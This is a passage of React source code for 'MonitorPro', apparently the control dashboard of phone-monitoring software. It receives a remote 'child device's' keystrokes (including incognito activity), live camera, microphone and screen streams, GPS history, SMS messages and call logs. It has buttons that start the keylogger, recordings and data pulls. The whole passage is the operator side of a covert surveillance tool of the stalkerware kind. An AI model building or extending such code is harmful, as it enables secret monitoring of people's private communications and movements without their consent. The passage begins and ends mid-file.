                      if (data.data) {
                        setAudioStreamStatus('Streaming');
                        try {
                            const binaryString = window.atob(data.data);
                            const len = binaryString.length;
                            const bytes = new Uint8Array(len);
                            for (let i = 0; i < len; i++) {
                                bytes[i] = binaryString.charCodeAt(i);
                            }
                            const pcmData = new Int16Array(bytes.buffer);
                            const audioData = new Float32Array(pcmData.length);
                            for (let i = 0; i < pcmData.length; i++) {
                                audioData[i] = pcmData[i] / 32768.0;
                            }

                            if (audioData.length > 0) {
                                audioQueueRef.current.push({
                                    samples: audioData,
                                    timestamp: data.timestamp,
                                    sequence: data.sequence,
                                });
                                if (!isPlayingRef.current) {
                                    playAudioQueue();
                                }
                            }
                        } catch (e) {
                            console.error('Error processing audio data:', e);
                            addNotification('Error', 'Failed to process audio data');
                        }
                      }
                    } else if (data.dataType === 'audio' && data.file) {
                      setAudioStreamStatus('Disconnected');
                      showToast(`Audio recording saved: ${data.file}`);
                      addNotification('Audio', `Audio recording saved: ${data.file}`);
                      fetchStorage();
                    } else if (data.dataType === 'recording_complete') {
                      const fileType = data.type.includes('camera') ? 'Video'
                          : data.type.includes('mic') ? 'Audio'
                          : data.type.includes('screen') ? 'Screen'
                          : 'File';
                      showToast(`${fileType} recording saved: ${data.file}`);
                      addNotification(fileType, `Recording saved: ${data.file}`);
                      fetchStorage();
                      if (data.type.includes('camera')) {
                        setVideoStreamStatus('Disconnected');
                      } else if (data.type.includes('mic')) {
                        setAudioStreamStatus('Disconnected');
                      } else if (data.type.includes('screen')) {
                        setScreenRecordStatus('Disconnected');
                      }
                    } else if (data.dataType === 'keylog') {
                        const payload = data.data || {};
                        const newKeylog = {
                            id: `${payload.timestamp}_${Math.random()}`,
                            appName: payload.app || 'Unknown App',
                            data: payload.keys || '',
                            eventType: payload.event_type || 'keylog',
                            timestamp: payload.timestamp,
                            sessionId: payload.session_id,
                            screenContent: payload.screen_content,
                            eventText: payload.event_text
                        };
                        setAllKeylogs(prev => [newKeylog, ...prev]);
                        if (newKeylog.eventType === 'search' || newKeylog.eventType === 'message' ||
                            (newKeylog.appName && (newKeylog.appName.includes('Private') || newKeylog.appName.includes('Incognito')))) {
                            addRecentActivity('keylog', `New ${newKeylog.eventType || 'activity'} in ${newKeylog.appName}`);
                        }
                    } else if (data.dataType === 'location') {
                      let lat, lng, address, timestamp;
                      
                      // Handle both direct location data and nested data structure
                      if (data.latitude && data.longitude) {
                        lat = data.latitude;
                        lng = data.longitude;
                        address = data.address;
                        timestamp = data.timestamp;
                      } else if (data.data && typeof data.data === 'object') {
                        lat = data.data.latitude;
                        lng = data.data.longitude;
                        address = data.data.address;
                        timestamp = data.timestamp;
                      } else {
                        console.warn('Invalid location data format:', data);
                        return;
                      }
                      
                      const newLocation = {
                        lat: lat,
                        lng: lng,
                        address: address || (await geocodeLocation(lat, lng)),
                        timestamp: timestamp,
                        id: `${timestamp}_${Math.random()}`,
                      };
                      setCurrentLocation(newLocation);
                      setLocations((prev) => [...prev, newLocation]);
                      setLocationHistory((prev) => [...prev, newLocation]);
                      addRecentActivity('location', `Location updated: ${newLocation.address}`);
                      setIsLocationFetching(false);
                    } else if (data.dataType === 'sms') {
                      const smsEntry = {
                        number: data.address || 'Unknown',
                        type: data.type || 'received',
                        content: data.body || '',
                        timestamp: new Date(data.timestamp).toLocaleString(),
                        id: `${data.timestamp}_${Math.random()}`,
                      };
                      setSmsMessages((prev) => [smsEntry, ...prev].slice(0, 100));
                      setSmsLogs((prev) => [...prev, smsEntry]);
                      addNotification('Communication', `New SMS received from ${smsEntry.number}`);
                    } else if (data.dataType === 'call_log') {
                      const callEntry = {
                        id: `${data.timestamp}_${Math.random()}`,
                        name: data.name,
                        number: data.number,
                        type: data.type,
                        duration: data.duration,
                        date: data.date || data.timestamp
                      };
                      setCallLogs((prev) => [callEntry, ...prev]);
                      addNotification('Communication', `New call log: ${callEntry.type} call from ${callEntry.name || data.number}`);
                    } else if (data.dataType === 'device_info') {
                      setDeviceInfo(data);
                      addNotification('System', 'Device information updated.');
                    } else if (data.dataType === 'app_icon') {
                      // Handle app icon data - could be stored or cached
                      console.log('Received app icon for:', data.package_name);
                      addNotification('System', `App icon received for ${data.app_name || data.package_name}`);
                    } else if (data.dataType === 'app_usage') {
                      const usagePayload = data.data || {};
                      addNotification('App Usage', `${usagePayload.appLabel || usagePayload.appName} used for ${Math.round((usagePayload.duration || 0) / 1000)}s`);
                    } else if (data.dataType === 'error') {
                        const errorType = (data.data_type || 'general').split('_')[0];
                        const errorMessage = data.message || 'An unknown error occurred on the device.';
                        showToast(`${errorType.charAt(0).toUpperCase() + errorType.slice(1)} Error: ${errorMessage}`);
                        addNotification('Error', `${errorType} Error: ${errorMessage}`);

                        const errorMapping = {
                          audio: setAudioStreamStatus,
                          camera: setVideoStreamStatus,
                          location: () => setIsLocationFetching(false),
                          screen_record: setScreenRecordStatus,
                        };
                        if (errorMapping[errorType]) {
                          errorMapping[errorType]('Failed');
                        }
                    } else if (data.dataType === 'audio_error' || data.dataType === 'camera_error' || data.dataType === 'location_error' || data.dataType === 'screen_record_error') {
                      const errorType = data.dataType.split('_')[0]; // audio, camera, or location
                      const errorMessages = {
                        'Missing RECORD_AUDIO permission': 'Please grant microphone permission on the child device.',
                        'Camera access denied': 'Please grant camera permission on the child device.',
                        'Audio source not supported': 'Selected microphone type is not supported, using default.',
                        'Missing location permission': 'Please grant location permission on the child device.',
                        'Permission not granted to record screen.': 'Screen recording permission has not been granted on the child device.'
                      };
                      const errorMessage = errorMessages[data.error] || data.error;
                      showToast(`${errorType.charAt(0).toUpperCase() + errorType.slice(1)} Error: ${errorMessage}`);
                      addNotification('Error', `${errorType} Error: ${errorMessage}`);
                      if (data.dataType === 'audio_error') {
                        setAudioStreamStatus('Failed');
                        audioQueueRef.current = [];
                        isPlayingRef.current = false;
                      } else if (data.dataType === 'camera_error') {
                        setVideoStreamStatus('Failed');
                        if (videoFrameRef.current) videoFrameRef.current.src = '';
                        isVideoPlaying.current = false;
                      } else if (data.dataType === 'location_error') {
                        setIsLocationFetching(false);
                      } else if (data.dataType === 'screen_record_error') {
                        setScreenRecordStatus('Failed');
                      }
                    }
                  } else if (event.data instanceof Blob) {
                    // This logic is now handled by the base64 decoder for audio_frame
                    // and camera_frame. It can be kept for other binary types or removed.
                    console.log("Received a binary blob, but no handler is implemented for it.", event.data);
                  }
            } catch (error) {
                console.error('Error processing WebSocket message:', error);
            }
        };
        
        wsRef.current.onclose = () => {
          setDeviceConnected(false);
          console.log('WebSocket disconnected');
          addNotification('System', 'WebSocket connection lost');
          isVideoPlaying.current = false;
          if (videoRenderLoopId.current) clearTimeout(videoRenderLoopId.current);
          setTimeout(connect, 3000);
        };

        wsRef.current.onerror = (error) => {
          console.error('WebSocket error:', error);
          addNotification('Error', 'WebSocket connection error');
        };
    };

    connect();
  }, [selectedDevice, fetchStorage]);

  const showToast = (message) => {
    setToastMessage(message);
    setTimeout(() => setToastMessage(''), 3000);
  };

  const calculateStorageUsed = (fileList = files) => {
    const totalSizeKB = fileList.reduce((sum, file) => sum + parseFloat(file.size || 0), 0);
    return (totalSizeKB / 1024).toFixed(2);
  };

  const formatKeylogContent = (log) => {
    const data = log.data || '';
    switch (log.eventType) {
        case 'keylog':
            return `Typed: ${data}`;
        case 'click':
            return `Clicked: ${data}`;
        case 'search':
            return `Searched: ${data}`;
        case 'browser_url':
            return `URL: ${data}`;
        default:
            return data;
    }
  };

  const formatDuration = (seconds) => {
    if (isNaN(seconds) || seconds < 0) return '00:00:00';
    const h = Math.floor(seconds / 3600).toString().padStart(2, '0');
    const m = Math.floor((seconds % 3600) / 60).toString().padStart(2, '0');
    const s = Math.floor(seconds % 60).toString().padStart(2, '0');
    return `${h}:${m}:${s}`;
  };

  const getCallStatus = (type) => {
    switch (type) {
        case 'Incoming':
        case 'Outgoing':
            return 'Called';
        case 'Blocked':
            return 'Blocked';
        case 'Rejected':
        case 'Missed':
            return 'Cancelled';
        default:
            return 'Unknown';
    }
  };

  const handleDateChange = (e) => {
    // Correctly handle date changes to prevent crashes
    const newDate = new Date(e.target.value);
    // Adjust for timezone offset to prevent date from changing
    const timezoneOffset = newDate.getTimezoneOffset() * 60000;
    setSelectedDate(new Date(newDate.getTime() + timezoneOffset));
  };

  const getActivityIcon = (type) => {
    switch (type) {
        case 'keylog': return faKeyboard;
        case 'location': return faMapMarkedAlt;
        case 'sms': return faSms;
        case 'call_log': return faPhone;
        case 'notification': return faBell;
        case 'app_usage': return faMobileAlt;
        case 'system': return faPowerOff;
        case 'video': return faVideo;
        case 'audio': return faMicrophone;
        case 'image': return faFileImage;
        default: return faFileImage;
    }
  };

  const changeDate = (offset) => {
      setSelectedDate(prevDate => {
          const newDate = new Date(prevDate);
          newDate.setDate(newDate.getDate() + offset);
          return newDate;
      });
  };

  const formattedDate = selectedDate.toISOString().split('T')[0];

  if (!isLoggedIn) {
    return (
      <div className="App">
        <div className="login-container">
          <div className="login">
            <div className="login-header">
              <div className="login-icon">🔒</div>
              <h2>Secure Access</h2>
              <p>Sign in to monitoring dashboard</p>
            </div>
            <input
              type="text"
              placeholder="Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button onClick={login}>Sign In</button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="App">
      <div className="dashboard-container">
        <div className="sidebar">
          <div className="sidebar-header">
            <div className="logo">
              <span className="logo-icon">📡</span>
              <h1>MonitorPro</h1>
            </div>
          </div>

          <nav className="sidebar-nav">
            <div className="device-selector">
                <label htmlFor="device-select">Device:</label>
                <select id="device-select" value={selectedDevice} onChange={(e) => handleDeviceChange(e.target.value)} disabled={devices.length === 0}>
                    {devices.length > 0 ? (
                        devices.map(device => <option key={device.deviceId} value={device.deviceId}>{device.deviceName === device.deviceId ? "(Unnamed Device)" : device.deviceName}</option>)
                    ) : (
                        <option>No devices found</option>
                    )}
                </select>
            </div>
            <button
              className={`nav-item ${activeSection === 'overview' ? 'active' : ''}`}
              onClick={() => setActiveSection('overview')}
            >
              <span className="nav-icon">📊</span>
              Overview
            </button>
            <button
              className={`nav-item ${activeSection === 'activities' ? 'active' : ''}`}
              onClick={() => setActiveSection('activities')}
            >
              <span className="nav-icon">📜</span>
              Activities
            </button>
            <button
              className={`nav-item ${activeSection === 'streams' ? 'active' : ''}`}
              onClick={() => setActiveSection('streams')}
            >
              <span className="nav-icon">📹</span>
              Live Streams
              {videoStreamStatus === 'Streaming' && <div className="status-dot active"></div>}
            </button>
            <button
              className={`nav-item ${activeSection === 'keylogs' ? 'active' : ''}`}
              onClick={() => setActiveSection('keylogs')}
            >
              <span className="nav-icon">⌨️</span>
              Keylogger
              {keyloggerStatus === 'Active' && <span className="badge">Live</span>}
            </button>
            <button
              className={`nav-item ${activeSection === 'location' ? 'active' : ''}`}
              onClick={() => setActiveSection('location')}
            >
              <span className="nav-icon">📍</span>
              Location
            </button>
            <button
              className={`nav-item ${activeSection === 'communication' ? 'active' : ''}`}
              onClick={() => setActiveSection('communication')}
            >
              <span className="nav-icon">💬</span>
              Communications
            </button>
            <button
              className={`nav-item ${activeSection === 'storage' ? 'active' : ''}`}
              onClick={() => setActiveSection('storage')}
            >
              <span className="nav-icon">💾</span>
              File Storage
            </button>
            <button
              className={`nav-item ${activeSection === 'controls' ? 'active' : ''}`}
              onClick={() => setActiveSection('controls')}
            >
              <span className="nav-icon">⚙️</span>
              Controls
            </button>
          </nav>

          <div className="device-status">
            <h4>Device Status</h4>
            <div className="status-item">
              <span>Connection:</span>
              <span className={`status ${deviceConnected ? 'connected' : 'disconnected'}`}>
                {deviceConnected ? 'Connected' : 'Disconnected'}
              </span>
            </div>
          </div>

          <button className="logout-btn" onClick={logout}>
            <span className="nav-icon">🚪</span>
            Sign Out
          </button>
        </div>

        <div className="main-content">
          <header className="top-header">
            <h2>
              {activeSection === 'overview' && 'Overview Dashboard'}
              {activeSection === 'activities' && 'Activity Timeline'}
              {activeSection === 'streams' && 'Live Streams'}
              {activeSection === 'keylogs' && 'Keylogger Data'}
              {activeSection === 'location' && 'Location Tracking'}
              {activeSection === 'communication' && 'Communications'}
              {activeSection === 'storage' && 'File Storage'}
              {activeSection === 'controls' && 'System Controls'}
            </h2>
            <div className="header-actions">
              <div className="current-time">🕐 {currentTime.toLocaleTimeString()}</div>
              <div className="connection-badge">
                <span className={`badge ${deviceConnected ? 'connected' : 'disconnected'}`}>
                  {deviceConnected ? 'Connected' : 'Disconnected'}
                </span>
              </div>
            </div>
          </header>

          <main className="content-area">
            {activeSection === 'overview' && (
              <div className="overview-section">
                <div className="device-info-card">
                  <h3>Device Information</h3>
                  {deviceInfo ? (
                    <div className="info-grid">
                      <div className="info-item">
                        <span className="icon">👤</span> Device Name: <strong>{deviceInfo.deviceName || 'Unknown'}</strong>
                      </div>
                      <div className="info-item">
                        <span className="icon">🔋</span> Battery Level: <strong>{deviceInfo.batteryLevel}%</strong>
                      </div>
                      <div className="info-item">
                        <span className="icon">📱</span> Device Model: <strong>{deviceInfo.deviceModel}</strong>
                      </div>
                      <div className="info-item">
                        <span className="icon">📍</span> GPS: <strong>{deviceInfo.gpsStatus || 'N/A'}</strong>
                      </div>
                      <div className="info-item">
                        <span className="icon">ℹ️</span> Device OS Version: <strong>{deviceInfo.osVersion}</strong>
                      </div>
                      <div className="info-item">
                        <span className="icon">📶</span> WiFi: <strong>{deviceInfo.wifiName || 'N/A'}</strong>
                      </div>
                      <div className="info-item">
                        <span className="icon">💻</span> Device Status:{' '}
                        <strong>{deviceConnected ? 'Online' : 'Offline'}</strong>
                      </div>
                      <div className="info-item">
                        <span className="icon">🔌</span> Charging:{' '}
                        <strong>{deviceInfo.chargingStatus || 'N/A'}</strong>
                      </div>
                    </div>
                  ) : (
                    <div className="placeholder">
                      <p>Device information will appear here once the device is connected.</p>
                      <button
                        className="btn-primary"
                        onClick={() => sendCommand('get_device_info')}
                        disabled={!deviceConnected}
                      >
                        🔄 Fetch Device Info
                      </button>
                    </div>
                  )}
                </div>

                <div className="stats-grid">
                  <div className="stat-card">
                    <div className="stat-icon">📹</div>
                    <div className="stat-content">
                      <h3>Active Streams</h3>
                      <p className="stat-value">{videoStreamStatus === 'Streaming' ? '1' : '0'}</p>
                      <span className="stat-label">
                        {videoStreamStatus === 'Streaming' ? 'Streaming' : 'No active connections'}
                      </span>
                    </div>
                  </div>
                  <div className="stat-card">
                    <div className="stat-icon">⌨️</div>
                    <div className="stat-content">
                      <h3>Today's Keylogs</h3>
                      <p className="stat-value">{allKeylogs.length}</p>
                      <span className="stat-label">Live Updates</span>
                    </div>
                  </div>
                  <div className="stat-card">
                    <div className="stat-icon">📍</div>
                    <div className="stat-content">
                      <h3>Location Updates</h3>
                      <p className="stat-value">{locations.length}</p>
                      <span className="stat-label">
                        {currentLocation
                          ? `Last: ${new Date(currentLocation.timestamp).toLocaleTimeString()}`
                          : 'No updates'}
                      </span>
                    </div>
                  </div>
                  <div className="stat-card">
                    <div className="stat-icon">💾</div>
                    <div className="stat-content">
                      <h3>Storage Used</h3>
                      <p className="stat-value">{calculateStorageUsed()} MB</p>
                      <span className="stat-label">of 10 MB</span>
                    </div>
                  </div>
                </div>

                <div className="overview-panels">
                  <div className="recent-activity">
                    <h3>Recent Activity</h3>
                    <div className="activity-list">
                      {recentActivity.length === 0 ? (
                        <p className="no-recent-activity">No activity</p>
                      ) : (
                        recentActivity.map((activity, index) => (
                          <div key={index} className="activity-item">
                            <div className={`activity-icon ${activity.type}`}>
                              {activity.type === 'keylog' ? '⌨️' : '📍'}
                            </div>
                            <div className="activity-content">
                              <p>{activity.message}</p>
                              <span>{activity.timestamp}</span>
                            </div>
                          </div>
                        ))
                      )}
                    </div>
                  </div>

                  <div className="notifications-panel">
                    <h3>Notifications</h3>
                    <div className="notifications-list">
                      {notifications.length === 0 ? (
                        <p>No notifications</p>
                      ) : (
                        notifications.map((notification) => (
                          <div
                            key={notification.id}
                            className={`notification-item ${notification.read ? 'read' : ''}`}
                          >
                            <div className={`notification-icon ${notification.type.toLowerCase()}`}>
                              {notification.type === 'System'
                                ? '⚙️'
                                : notification.type === 'Keylogger'
                                ? '⌨️'
                                : notification.type === 'Location'
                                ? '📍'
                                : notification.type === 'Audio'
                                ? '🎤'
                                : notification.type === 'Video'
                                ? '📹'
                                : notification.type === 'Communication'
                                ? '💬'
                                : notification.type === 'Storage'
                                ? '💾'
                                : '❓'}
                            </div>
                            <div className="notification-content">
                              <p>
                                <strong>{notification.type}:</strong> {notification.message}
                              </p>
                              <span>{notification.timestamp}</span>
                            </div>
                            <button
                              className="dismiss-btn"
                              onClick={() => dismissNotification(notification.id)}
                              title="Dismiss"
                            >
                              ✕
                            </button>
                          </div>
                        ))
                      )}
                    </div>
                  </div>
                </div>
              </div>
            )}

            {activeSection === 'activities' && (
              <div className="activities-section">
                <div className="timeline-header">
                  <div className="tabs">
                    <button
                      className={`tab-btn ${activeTab === 'activities' ? 'active' : ''}`}
                      onClick={() => setActiveTab('activities')}
                    >
                      <FontAwesomeIcon icon={faMobileAlt} /> Activities
                    </button>
                    <button
                      className={`tab-btn ${activeTab === 'notifications' ? 'active' : ''}`}
                      onClick={() => setActiveTab('notifications')}
                    >
                      <FontAwesomeIcon icon={faBell} /> Notifications
                    </button>
                  </div>
                  <div className="date-controls">
                    <button onClick={() => changeDate(-1)}><FontAwesomeIcon icon={faChevronLeft} /></button>
                    <input type="date" value={formattedDate} onChange={handleDateChange} />
                    <button onClick={() => changeDate(1)}><FontAwesomeIcon icon={faChevronRight} /></button>
                  </div>
                </div>
                {activeTab === 'activities'
                  ? renderTimeline(activities)
                  : renderTimeline(notifications)}
              </div>
            )}

            {activeSection === 'streams' && (
              <div className="streams-section">
                <div className="stream-controls">
                  <div className="control-group">
                    <h3>
                      Video Stream Controls{' '}
                      <span className={`status-badge ${videoStreamStatus.toLowerCase()}`}>
                        {videoStreamStatus}
                      </span>
                    </h3>
                    <div className="controls-row">
                      <div className="control-item">
                        <label>FPS:</label>
                        <select value={fps} onChange={(e) => setFps(e.target.value)}>
                          <option value="1">1 FPS</option>
                          <option value="2">2 FPS</option>
                          <option value="5">5 FPS</option>
                          <option value="10">10 FPS</option>
                          <option value="15">15 FPS</option>
                          <option value="20">20 FPS</option>
                          <option value="30">30 FPS</option>
                        </select>
                      </div>
                      <div className="control-item">
                        <label>Resolution:</label>
                        <select value={resolution} onChange={(e) => setResolution(e.target.value)}>
                          <option value="320x240">320x240</option>
                          <option value="640x480">640x480</option>
                          <option value="1280x720">1280x720</option>
                        </select>
                      </div>
                      <div className="control-item">
                        <label>Camera:</label>
                        <select value={cameraType} onChange={(e) => setCameraType(e.target.value)}>
                          <option value="back">Back Camera</option>
                          <option value="front">Front Camera</option>
                        </select>
                      </div>
                    </div>
                    <div className="button-group">
                      <button
                        onClick={() => sendCommand('start_camera')}
                        disabled={
                          videoStreamStatus === 'Streaming' ||
                          videoStreamStatus === 'Connecting' ||
                          videoStreamStatus === 'Recording'
                        }
                        className="btn-primary"
                      >
                        ▶️ Start Stream
                      </button>
                      <button
                        onClick={() => sendCommand('stop_camera')}
                        disabled={videoStreamStatus === 'Disconnected' || videoStreamStatus === 'Recording'}
                        className="btn-secondary"
                      >
                        ⏹ Stop Stream
                      </button>
                      {videoStreamStatus === 'Recording' ? (
                        <button
                          onClick={() => sendCommand('stop_record_camera')}
                          className="btn-secondary"
                        >
                          ⏹ Stop Recording
                        </button>
                      ) : (
                        <button
                          onClick={() => sendCommand('record_camera')}
                          disabled={
                            videoStreamStatus === 'Streaming' ||
                            videoStreamStatus === 'Connecting'
                          }
                          className="btn-primary"
                        >
                          📹 Record Video
                        </button>
                      )}
                      {videoStreamStatus === 'Failed' && (
                        <button
                          onClick={() => sendCommand('start_camera')}
                          className="btn-primary"
                        >
                          🔄 Retry
                        </button>
                      )}
                    </div>
                  </div>

                  <div className="control-group">
                    <h3>
                      Audio Stream Controls{' '}
                      <span className={`status-badge ${audioStreamStatus.toLowerCase()}`}>
                        {audioStreamStatus}
                      </span>
                    </h3>
                    <div className="controls-row">
                      <div className="control-item">
                        <label>Sample Rate:</label>
                        <select
                          value={sampleRate}
                          onChange={(e) => setSampleRate(e.target.value)}
                        >
                          <option value="8000">8000 Hz</option>
                          <option value="11025">11025 Hz</option>
                          <option value="16000">16000 Hz</option>
                          <option value="22050">22050 Hz</option>
                          <option value="44100">44100 Hz</option>
                          <option value="48000">48000 Hz</option>
                        </select>
                      </div>
                      <div className="control-item">
                        <label>Microphone:</label>
                        <select value={audioMicType} onChange={(e) => setAudioMicType(e.target.value)}>
                          <option value="default">Default</option>
                          <option value="front">Front Mic</option>
                          <option value="back">Back Mic</option>
                          <option value="voice">Voice Mic</option>
                        </select>
                      </div>
                    </div>
                    <div className="button-group">
                      <button
                        onClick={() => sendCommand('start_audio')}
                        disabled={
                          audioStreamStatus === 'Streaming' ||
                          audioStreamStatus === 'Connecting' ||
                          audioStreamStatus === 'Recording'
                        }
                        className="btn-primary"
                      >
                        🎤 Start Audio
                      </button>
                      <button
                        onClick={() => sendCommand('stop_audio')}
                        disabled={audioStreamStatus === 'Disconnected' || audioStreamStatus === 'Recording'}
                        className="btn-secondary"
                      >
                        ⏸ Stop Stream
                      </button>
                      {audioStreamStatus === 'Recording' ? (
                        <button
                          onClick={() => sendCommand('stop_record_audio')}
                          className="btn-secondary"
                        >
                          ⏹ Stop Recording
                        </button>
                      ) : (
                        <button
                          onClick={() => sendCommand('record_audio')}
                          disabled={
                            audioStreamStatus === 'Streaming' ||
                            audioStreamStatus === 'Connecting'
                          }
                          className="btn-primary"
                        >
                          🎤 Record Audio
                        </button>
                      )}
                      {audioStreamStatus === 'Failed' && (
                        <button
                          onClick={() => sendCommand('start_audio')}
                          className="btn-primary"
                        >
                          🔄 Retry
                        </button>
                      )}
                    </div>
                  </div>

                  <div className="control-group">
                    <h3>
                      Screen Recording{' '}
                      <span className={`status-badge ${screenRecordStatus.toLowerCase()}`}>
                        {screenRecordStatus}
                      </span>
                    </h3>
                    <div className="controls-row">
                        <div className="control-item">
                            <label>Duration (seconds):</label>
                            <input
                                type="number"
                                value={screenRecordDuration}
                                onChange={(e) => setScreenRecordDuration(e.target.value)}
                                min="1"
                                className="duration-input"
                            />
                        </div>
                        <div className="control-item">
                            <label>FPS:</label>
                            <select value={screenRecordFps} onChange={(e) => setScreenRecordFps(e.target.value)}>
                                <option value="1">1 FPS</option>
                                <option value="2">2 FPS</option>
                                <option value="5">5 FPS</option>
                                <option value="10">10 FPS</option>
                                <option value="15">15 FPS</option>
                                <option value="20">20 FPS</option>
                                <option value="25">25 FPS</option>
                                <option value="30">30 FPS</option>
                            </select>
                        </div>
                    </div>
                    <div className="button-group">
                        <button
                            onClick={() => sendCommand('start_screen_recording')}
                            disabled={screenRecordStatus === 'Recording'}
                            className="btn-primary"
                        >
                            ⏺️ Start Recording
                        </button>
                        <button
                            onClick={() => sendCommand('stop_screen_recording')}
                            disabled={screenRecordStatus !== 'Recording'}
                            className="btn-secondary"
                        >
                            ⏹ Stop Recording
                        </button>
                        {screenRecordStatus === 'Failed' && (
                            <button
                                onClick={() => sendCommand('start_screen_recording')}
                                className="btn-primary"
                            >
                                🔄 Retry
                            </button>
                        )}
                    </div>
                  </div>
                </div>

                <div className="live-display">
                  <div className="video-container">
                    <div className="video-header">
                      <h3>Live Video Feed</h3>
                      {videoStreamStatus === 'Streaming' && (
                        <button
                          className="btn-small fullscreen-btn"
                          onClick={() => {
                            if (videoFrameRef.current) {
                              if (videoFrameRef.current.requestFullscreen) {
                                videoFrameRef.current.requestFullscreen();
                              } else if (videoFrameRef.current.webkitRequestFullscreen) {
                                videoFrameRef.current.webkitRequestFullscreen();
                              }
                            }
                          }}
                          title="Fullscreen"
                        >
                          ⛶
                        </button>
                      )}
                    </div>
                    <div className="video-frame">
                      <img
                          ref={videoFrameRef}
                          alt="Live video stream"
                          style={{
                            width: '100%',
                            height: 'auto',
                            borderRadius: '8px',
                            imageRendering: 'optimizeSpeed',
                            display: videoStreamStatus === 'Streaming' ? 'block' : 'none',
                          }}
                          onLoad={() => {
                            if (videoFrameRef.current) {
                              videoFrameRef.current.style.imageRendering = 'optimizeSpeed';
                            }
                          }}
                        />
                      {videoStreamStatus !== 'Streaming' && (
                        <div className="placeholder">
                          <span>📹</span>
                          <p>
                            {videoStreamStatus === 'Connecting'
                              ? 'Buffering...'
                              : 'No video stream active'}
                          </p>
                          <small>Start video stream to view feed</small>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="audio-container">
                    <h3>Audio Visualization</h3>
                    <div className="audio-frame">
                      {audioStreamStatus === 'Streaming' ? (
                        <canvas ref={canvasRef} width="800" height="200"></canvas>
                      ) : (
                        <div className="placeholder">
                          <span>🎤</span>
                          <p>No audio stream active</p>
                          <small>Start audio stream to view waveform</small>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            )}

            {activeSection === 'keylogs' && (
              <div className="keylogs-section">
                <div className="section-header">
                  <h3>Keylogger</h3>
                  <div className="button-group">
                    <button
                      onClick={() => sendCommand('start_keylogger')}
                      disabled={keyloggerStatus === 'Active' || keyloggerStatus === 'Connecting'}
                      className="btn-primary"
                    >
                      ▶️ Start Keylogger
                    </button>
                    <button
                      onClick={() => sendCommand('stop_keylogger')}
                      disabled={keyloggerStatus === 'Disconnected'}
                      className="btn-secondary"
                    >
                      ⏹ Stop Keylogger
                    </button>
                  </div>
                </div>

                <div className="keylog-table-container">
                    <table className="keylog-table">
                        <thead>
                            <tr>
                                <th>App</th>
                                <th>Text</th>
                                <th>Date</th>
                            </tr>
                        </thead>
                        <tbody>
                            {allKeylogs.map((log) => (
                                <tr key={log.id || log.timestamp}>
                                    <td>{log.appName}</td>
                                    <td>{formatKeylogContent(log)}</td>
                                    <td>{new Date(log.timestamp).toLocaleString()}</td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                </div>
              </div>
            )}

            {activeSection === 'location' && (
              <div className="location-section">
                <div className="section-header">
                  <h3>Location Tracking</h3>
                  <div className="button-group">
                    <button
                      className="btn-primary"
                      onClick={() => sendCommand('start_location')}
                      disabled={isLocationFetching}
                    >
                      📍 Get Location
                    </button>
                  </div>
                </div>

                <div className="current-location">
                  <h4>Current Location</h4>
                  <div className="location-info">
                    <div className="location-details">
                      {currentLocation ? (
                        <>
                          <p>
                            <strong>📍 Coordinates:</strong> {currentLocation.lat}, {currentLocation.lng}
                          </p>
                          <p>
                            <strong>📮 Address:</strong> {currentLocation.address}
                          </p>
                          <p>
                            <strong>🕐 Last Updated:</strong>{' '}
                            {new Date(currentLocation.timestamp).toLocaleString()}
                          </p>
                        </>
                      ) : (
                        <p>No current location data available.</p>
                      )}
                    </div>
                  </div>
                  <div className="map-container" style={{ height: '400px', width: '100%' }}>
                    {currentLocation ? (
                      <MapContainer
                        center={[currentLocation.lat, currentLocation.lng]}
                        zoom={15}
                        style={{ height: '100%', width: '100%' }}
                      >
                        <TileLayer
                          url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
                          attribution='© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                        />
                        <Marker position={[currentLocation.lat, currentLocation.lng]}>
                          <Popup position={[currentLocation.lat, currentLocation.lng]}>
                            Current Location: {currentLocation.address}
                            <br />
                            Updated: {new Date(currentLocation.timestamp).toLocaleString()}
                          </Popup>
                        </Marker>
                        {locationHistory.length > 0 && (
                          <>
                            {locationHistory.map((loc, index) => (
                              <Marker key={index} position={[loc.lat, loc.lng]}>
                                <Popup position={[loc.lat, loc.lng]}>
                                  History: {loc.address}
                                  <br />
                                  Timestamp: {new Date(loc.timestamp).toLocaleString()}
                                </Popup>
                              </Marker>
                            ))}
                            <Polyline
                              positions={locationHistory.map((loc) => [loc.lat, loc.lng])}
                              color="blue"
                            />
                          </>
                        )}
                      </MapContainer>
                    ) : (
                      <div className="placeholder">
                        <span>🗺️</span>
                        <p>No location data to display map</p>
                        <small>Click "Get Location" to fetch the current location</small>
                      </div>
                    )}
                  </div>
                </div>

                <div className="location-history">
                  <h4>Location History</h4>
                  <div className="history-table">
                    <table>
                      <thead>
                        <tr>
                          <th>Timestamp</th>
                          <th>Coordinates</th>
                          <th>Address</th>
                        </tr>
                      </thead>
                      <tbody>
                        {locations.map((location) => (
                          <tr key={location.id}>
                            <td>{new Date(location.timestamp).toLocaleString()}</td>
                            <td>
                              {location.lat}, {location.lng}
                            </td>
                            <td>{location.address}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            )}

            {activeSection === 'communication' && (
              <div className="communication-section">
                <div className="section-header">
                  <h3>Communications</h3>
                  <div className="button-group">
                    <button className="btn-primary" onClick={() => sendCommand('read_sms')}>
                      📱 Get SMS Messages
                    </button>
                    <button className="btn-primary" onClick={() => sendCommand('read_call_log')}>
                      📞 Get Call Logs
                    </button>
                    <button className="btn-secondary" onClick={exportData}>
                      📥 Export Data
                    </button>
                  </div>
                </div>

                <div className="comm-stats">
                  <div className="stat-card">
                    <div className="stat-icon">💬</div>
                    <div>
                      <h4>SMS Messages</h4>
                      <p>{smsLogs.length}</p>
                    </div>
                  </div>
                  <div className="stat-card">
                    <div className="stat-icon">📞</div>
                    <div>
                      <h4>Phone Calls</h4>
                      <p>{callLogs.length}</p>
                    </div>
                  </div>
                </div>

                <div className="communication-grid">
                  <div className="tab-buttons">
                    <button
                      className={`tab-btn ${activeCommTab === 'sms' ? 'active' : ''}`}
                      onClick={() => setActiveCommTab('sms')}
                    >
                      SMS Messages
                    </button>
                    <button
